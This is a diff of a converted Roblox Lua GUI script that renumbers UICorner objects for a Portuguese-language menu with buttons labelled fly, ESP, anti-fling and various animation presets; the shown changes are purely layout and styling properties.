+Converted["_UICorner7"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner7"].Parent = Converted["_keybutton"]
 
 Converted["_UITextSizeConstraint9"].MaxTextSize = 25
 Converted["_UITextSizeConstraint9"].Parent = Converted["_clicktpButton"]
@@ -733,12 +741,12 @@ Converted["_VoarButton"].Parent = Converted["_ScrollingFrame"]
 Converted["_UITextSizeConstraint10"].MaxTextSize = 20
 Converted["_UITextSizeConstraint10"].Parent = Converted["_VoarButton"]
 
-Converted["_UICorner9"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner9"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner9"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner9"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner9"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner9"].Parent = Converted["_VoarButton"]
+Converted["_UICorner8"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner8"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner8"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner8"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner8"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner8"].Parent = Converted["_VoarButton"]
 
 Converted["_TextLabel3"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel3"].Text = "Voar"
@@ -776,12 +784,12 @@ Converted["_keybutton1"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton1"].Name = "keybutton"
 Converted["_keybutton1"].Parent = Converted["_VoarButton"]
 
-Converted["_UICorner10"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner10"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner10"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner10"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner10"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner10"].Parent = Converted["_keybutton1"]
+Converted["_UICorner9"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner9"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner9"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner9"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner9"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner9"].Parent = Converted["_keybutton1"]
 
 Converted["_UITextSizeConstraint12"].MaxTextSize = 15
 Converted["_UITextSizeConstraint12"].Parent = Converted["_keybutton1"]
@@ -808,12 +816,12 @@ Converted["_FantasmaVerButton"].Parent = Converted["_ScrollingFrame"]
 Converted["_UITextSizeConstraint13"].MaxTextSize = 20
 Converted["_UITextSizeConstraint13"].Parent = Converted["_FantasmaVerButton"]
 
-Converted["_UICorner11"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner11"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner11"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner11"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner11"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner11"].Parent = Converted["_FantasmaVerButton"]
+Converted["_UICorner10"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner10"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner10"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner10"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner10"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner10"].Parent = Converted["_FantasmaVerButton"]
 
 Converted["_TextLabel4"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel4"].Text = "Ver Fantasma"
@@ -851,12 +859,12 @@ Converted["_keybutton2"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton2"].Name = "keybutton"
 Converted["_keybutton2"].Parent = Converted["_FantasmaVerButton"]
 
-Converted["_UICorner12"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner12"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner12"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner12"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner12"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner12"].Parent = Converted["_keybutton2"]
+Converted["_UICorner11"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner11"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner11"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner11"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner11"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner11"].Parent = Converted["_keybutton2"]
 
 Converted["_UITextSizeConstraint15"].MaxTextSize = 15
 Converted["_UITextSizeConstraint15"].Parent = Converted["_keybutton2"]
@@ -880,12 +888,12 @@ Converted["_EspButton"].Size = UDim2.new(0.286853015, 0, 0.114044294, 0)
 Converted["_EspButton"].Name = "EspButton"
 Converted["_EspButton"].Parent = Converted["_ScrollingFrame"]
 
-Converted["_UICorner13"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner13"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner13"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner13"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner13"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner13"].Parent = Converted["_EspButton"]
+Converted["_UICorner12"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner12"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner12"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner12"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner12"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner12"].Parent = Converted["_EspButton"]
 
 Converted["_keybutton3"].Font = Enum.Font.FredokaOne
 Converted["_keybutton3"].PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
@@ -907,12 +915,12 @@ Converted["_keybutton3"].Parent = Converted["_EspButton"]
 Converted["_UITextSizeConstraint16"].MaxTextSize = 20
 Converted["_UITextSizeConstraint16"].Parent = Converted["_keybutton3"]
 
-Converted["_UICorner14"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner14"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner14"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner14"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner14"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner14"].Parent = Converted["_keybutton3"]
+Converted["_UICorner13"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner13"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner13"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner13"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner13"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner13"].Parent = Converted["_keybutton3"]
 
 Converted["_UITextSizeConstraint17"].MaxTextSize = 25
 Converted["_UITextSizeConstraint17"].Parent = Converted["_EspButton"]
@@ -955,12 +963,12 @@ Converted["_antiflingButton"].Parent = Converted["_ScrollingFrame"]
 Converted["_UITextSizeConstraint18"].MaxTextSize = 20
 Converted["_UITextSizeConstraint18"].Parent = Converted["_antiflingButton"]
 
-Converted["_UICorner15"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner15"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner15"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner15"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner15"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner15"].Parent = Converted["_antiflingButton"]
+Converted["_UICorner14"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner14"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner14"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner14"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner14"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner14"].Parent = Converted["_antiflingButton"]
 
 Converted["_TextLabel6"].Font = Enum.Font.FredokaOne
 Converted["_TextLabel6"].Text = "Anti-Fling"
@@ -998,12 +1006,12 @@ Converted["_keybutton4"].Size = UDim2.new(0.180663973, 0, 0.756362855, 0)
 Converted["_keybutton4"].Name = "keybutton"
 Converted["_keybutton4"].Parent = Converted["_antiflingButton"]
 
-Converted["_UICorner16"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner16"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner16"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner16"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner16"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner16"].Parent = Converted["_keybutton4"]
+Converted["_UICorner15"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner15"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner15"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner15"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner15"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner15"].Parent = Converted["_keybutton4"]
 
 Converted["_UITextSizeConstraint20"].MaxTextSize = 15
 Converted["_UITextSizeConstraint20"].Parent = Converted["_keybutton4"]
@@ -1012,12 +1020,12 @@ Converted["_UIStroke7"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 Converted["_UIStroke7"].Thickness = 2
 Converted["_UIStroke7"].Parent = Converted["_antiflingButton"]
 
-Converted["_UICorner17"].BottomLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner17"].BottomRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner17"].CornerRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner17"].TopLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner17"].TopRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner17"].Parent = Converted["_ScrollingFrame"]
+Converted["_UICorner16"].BottomLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner16"].BottomRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner16"].CornerRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner16"].TopLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner16"].TopRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner16"].Parent = Converted["_ScrollingFrame"]
 
 Converted["_UIListLayout"].Padding = UDim.new(0, 9)
 Converted["_UIListLayout"].SortOrder = Enum.SortOrder.LayoutOrder
@@ -1057,12 +1065,12 @@ Converted["_RunButton"].Parent = Converted["_ScrollingFrame1"]
 Converted["_UITextSizeConstraint21"].MaxTextSize = 20
 Converted["_UITextSizeConstraint21"].Parent = Converted["_RunButton"]
 
-Converted["_UICorner18"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner18"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner18"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner18"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner18"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner18"].Parent = Converted["_RunButton"]
+Converted["_UICorner17"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner17"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner17"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner17"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner17"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner17"].Parent = Converted["_RunButton"]
 
 Converted["_GirarButton"].Font = Enum.Font.FredokaOne
 Converted["_GirarButton"].Text = ""
@@ -1082,19 +1090,19 @@ Converted["_GirarButton"].Parent = Converted["_ScrollingFrame1"]
 Converted["_UITextSizeConstraint22"].MaxTextSize = 20
 Converted["_UITextSizeConstraint22"].Parent = Converted["_GirarButton"]
 
-Converted["_UICorner19"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner19"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner19"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner19"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner19"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner19"].Parent = Converted["_GirarButton"]
+Converted["_UICorner18"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner18"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner18"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner18"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner18"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner18"].Parent = Converted["_GirarButton"]
 
-Converted["_UICorner20"].BottomLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner20"].BottomRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner20"].CornerRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner20"].TopLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner20"].TopRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner20"].Parent = Converted["_ScrollingFrame1"]
+Converted["_UICorner19"].BottomLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner19"].BottomRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner19"].CornerRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner19"].TopLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner19"].TopRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner19"].Parent = Converted["_ScrollingFrame1"]
 
 Converted["_UIGridLayout1"].CellPadding = UDim2.new(0.0199999996, 0, 0.00999999978, 0)
 Converted["_UIGridLayout1"].CellSize = UDim2.new(0.49000001, 0, 0.100000001, 0)
@@ -1133,12 +1141,12 @@ Converted["_vampiro"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_vampiro"].Name = "vampiro"
 Converted["_vampiro"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner21"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner21"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner21"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner21"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner21"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner21"].Parent = Converted["_vampiro"]
+Converted["_UICorner20"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner20"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner20"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner20"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner20"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner20"].Parent = Converted["_vampiro"]
 
 Converted["_UITextSizeConstraint23"].MaxTextSize = 20
 Converted["_UITextSizeConstraint23"].Parent = Converted["_vampiro"]
@@ -1160,12 +1168,12 @@ Converted["_zumbie"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_zumbie"].Name = "zumbie"
 Converted["_zumbie"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner22"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner22"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner22"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner22"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner22"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner22"].Parent = Converted["_zumbie"]
+Converted["_UICorner21"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner21"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner21"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner21"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner21"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner21"].Parent = Converted["_zumbie"]
 
 Converted["_UITextSizeConstraint24"].MaxTextSize = 20
 Converted["_UITextSizeConstraint24"].Parent = Converted["_zumbie"]
@@ -1187,12 +1195,12 @@ Converted["_adidas"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_adidas"].Name = "adidas"
 Converted["_adidas"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner23"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner23"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner23"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner23"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner23"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner23"].Parent = Converted["_adidas"]
+Converted["_UICorner22"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner22"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner22"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner22"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner22"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner22"].Parent = Converted["_adidas"]
 
 Converted["_UITextSizeConstraint25"].MaxTextSize = 20
 Converted["_UITextSizeConstraint25"].Parent = Converted["_adidas"]
@@ -1214,12 +1222,12 @@ Converted["_Bolhoso"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_Bolhoso"].Name = "Bolhoso"
 Converted["_Bolhoso"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner24"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner24"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner24"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner24"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner24"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner24"].Parent = Converted["_Bolhoso"]
+Converted["_UICorner23"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner23"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner23"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner23"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner23"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner23"].Parent = Converted["_Bolhoso"]
 
 Converted["_UITextSizeConstraint26"].MaxTextSize = 20
 Converted["_UITextSizeConstraint26"].Parent = Converted["_Bolhoso"]
@@ -1241,12 +1249,12 @@ Converted["_ninja"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_ninja"].Name = "ninja"
 Converted["_ninja"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner25"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner25"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner25"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner25"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner25"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner25"].Parent = Converted["_ninja"]
+Converted["_UICorner24"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner24"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner24"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner24"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner24"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner24"].Parent = Converted["_ninja"]
 
 Converted["_UITextSizeConstraint27"].MaxTextSize = 20
 Converted["_UITextSizeConstraint27"].Parent = Converted["_ninja"]
@@ -1268,12 +1276,12 @@ Converted["_lobo"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_lobo"].Name = "lobo"
 Converted["_lobo"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner26"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner26"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner26"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner26"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner26"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner26"].Parent = Converted["_lobo"]
+Converted["_UICorner25"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner25"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner25"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner25"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner25"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner25"].Parent = Converted["_lobo"]
 
 Converted["_UITextSizeConstraint28"].MaxTextSize = 20
 Converted["_UITextSizeConstraint28"].Parent = Converted["_lobo"]
@@ -1296,12 +1304,12 @@ Converted["_mago"].Visible = false
 Converted["_mago"].Name = "mago"
 Converted["_mago"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner27"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner27"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner27"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner27"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner27"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner27"].Parent = Converted["_mago"]
+Converted["_UICorner26"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner26"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner26"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner26"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner26"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner26"].Parent = Converted["_mago"]
 
 Converted["_UITextSizeConstraint29"].MaxTextSize = 20
 Converted["_UITextSizeConstraint29"].Parent = Converted["_mago"]
@@ -1323,12 +1331,12 @@ Converted["_levitar"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_levitar"].Name = "levitar"
 Converted["_levitar"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner28"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner28"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner28"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner28"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner28"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner28"].Parent = Converted["_levitar"]
+Converted["_UICorner27"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner27"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner27"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner27"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner27"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner27"].Parent = Converted["_levitar"]
 
 Converted["_UITextSizeConstraint30"].MaxTextSize = 20
 Converted["_UITextSizeConstraint30"].Parent = Converted["_levitar"]
@@ -1350,12 +1358,12 @@ Converted["_cartoon"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_cartoon"].Name = "cartoon"
 Converted["_cartoon"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner29"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner29"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner29"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner29"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner29"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner29"].Parent = Converted["_cartoon"]
+Converted["_UICorner28"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner28"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner28"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner28"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner28"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner28"].Parent = Converted["_cartoon"]
 
 Converted["_UITextSizeConstraint31"].MaxTextSize = 20
 Converted["_UITextSizeConstraint31"].Parent = Converted["_cartoon"]
@@ -1378,12 +1386,12 @@ Converted["_amazon"].Visible = false
 Converted["_amazon"].Name = "amazon"
 Converted["_amazon"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner30"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner30"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner30"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner30"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner30"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner30"].Parent = Converted["_amazon"]
+Converted["_UICorner29"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner29"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner29"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner29"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner29"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner29"].Parent = Converted["_amazon"]
 
 Converted["_UITextSizeConstraint32"].MaxTextSize = 20
 Converted["_UITextSizeConstraint32"].Parent = Converted["_amazon"]
@@ -1405,12 +1413,12 @@ Converted["_astronauta"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_astronauta"].Name = "astronauta"
 Converted["_astronauta"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner31"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner31"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner31"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner31"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner31"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner31"].Parent = Converted["_astronauta"]
+Converted["_UICorner30"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner30"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner30"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner30"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner30"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner30"].Parent = Converted["_astronauta"]
 
 Converted["_UITextSizeConstraint33"].MaxTextSize = 20
 Converted["_UITextSizeConstraint33"].Parent = Converted["_astronauta"]
@@ -1432,12 +1440,12 @@ Converted["_superhero"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_superhero"].Name = "superhero"
 Converted["_superhero"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner32"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner32"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner32"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner32"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner32"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner32"].Parent = Converted["_superhero"]
+Converted["_UICorner31"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner31"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner31"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner31"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner31"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner31"].Parent = Converted["_superhero"]
 
 Converted["_UITextSizeConstraint34"].MaxTextSize = 20
 Converted["_UITextSizeConstraint34"].Parent = Converted["_superhero"]
@@ -1459,12 +1467,12 @@ Converted["_antiga"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_antiga"].Name = "antiga"
 Converted["_antiga"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner33"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner33"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner33"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner33"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner33"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner33"].Parent = Converted["_antiga"]
+Converted["_UICorner32"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner32"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner32"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner32"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner32"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner32"].Parent = Converted["_antiga"]
 
 Converted["_UITextSizeConstraint35"].MaxTextSize = 20
 Converted["_UITextSizeConstraint35"].Parent = Converted["_antiga"]
@@ -1486,12 +1494,12 @@ Converted["_Estileira"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
 Converted["_Estileira"].Name = "Estileira"
 Converted["_Estileira"].Parent = Converted["_anima��es"]
 
-Converted["_UICorner34"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner34"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner34"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner34"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner34"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner34"].Parent = Converted["_Estileira"]
+Converted["_UICorner33"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner33"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner33"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner33"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner33"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner33"].Parent = Converted["_Estileira"]
 
 Converted["_UITextSizeConstraint36"].MaxTextSize = 20
 Converted["_UITextSizeConstraint36"].Parent = Converted["_Estileira"]
@@ -1513,12 +1521,12 @@ Converted["_Rob�"].Size = UDim2.new(0.300000012, 0, 0.119999997, 0)
